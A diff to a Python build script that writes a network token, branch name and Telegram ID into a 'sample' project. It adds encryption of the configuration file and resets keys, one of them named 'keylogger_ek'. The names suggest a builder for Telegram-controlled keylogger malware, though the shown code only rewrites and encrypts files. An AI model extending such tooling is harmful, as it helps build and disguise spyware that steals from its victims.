@@ -7,6 +7,7 @@ import subprocess
 import shutil
 import config
 import constants
+import Crypt
 
 
 def get_branch_path(branch_name):
@@ -161,15 +162,17 @@ def rewrite_file(path, value):
         file.write(value)
 
 
-def edit_sample(network_token, branch_name, telegram_id):
+def edit_sample(encryption_keys, network_token, branch_name, telegram_id):
     rewrite_file(config.network_token_path,
                  config.network_token_value.format(network_token=network_token))
 
     rewrite_file(config.branch_name_path,
                  config.branch_name_value.format(branch_name=branch_name))
 
-    rewrite_file(config.permissions_file_path,
-                 config.permissions_file_value.format(telegram_id=telegram_id))
+    configuration_file_value = encrypt_configuration(
+        config.configuration_file_value.format(telegram_id=telegram_id), encryption_keys)
+    rewrite_file(config.configuration_file_path,
+                 configuration_file_value)
 
 
 def restore_sample(network_token, branch_name, telegram_id):
@@ -179,8 +182,21 @@ def restore_sample(network_token, branch_name, telegram_id):
     rewrite_file(config.branch_name_path,
                  config.branch_name_value.format(branch_name=''))
 
-    rewrite_file(config.permissions_file_path,
-                 config.permissions_file_value.format(telegram_id=''))
+    rewrite_file(config.configuration_file_path,
+                 config.configuration_file_value.format(telegram_id=''))
+
+    rewrite_file(config.encryption_keys_path,
+                 config.encryption_keys_sample.format(configuration_ek='', keylogger_ek='', salt=''))
+
+
+def encrypt_configuration(configuration, encryption_keys):
+    configuration_ek = encryption_keys['configuration_ek'][1]
+    salt = encryption_keys['salt'][1]
+
+    configuration = Crypt.encrypt(
+        configuration, configuration_ek, salt)
+
+    return configuration
 
 
 def create_branch_dir(network_token, branch_name):
